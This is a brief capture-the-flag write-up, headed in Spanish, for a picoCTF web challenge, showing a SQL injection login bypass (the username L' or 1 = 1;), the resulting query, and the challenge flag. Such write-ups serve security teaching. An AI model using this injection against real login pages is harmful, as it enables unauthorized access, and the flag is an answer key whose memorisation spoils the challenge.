## Descripcion
There is a website running at `https://jupiter.challenges.picoctf.org/problem/33850/` ([link](https://jupiter.challenges.picoctf.org/problem/33850/)) or http://jupiter.challenges.picoctf.org:33850. Do you think you can log us in? Try to see if you can login!

## Pistas 
****** 
## Solucion
```sql
--username: L' or 1 = 1;
--password: haaaa
SQL query: SELECT * FROM users WHERE name='L' or 1 = 1;' AND password='haaaa'
```
## bandera
picoCTF{s0m3_SQL_f8adf3fb}

## Notas adicionales 

## Referencias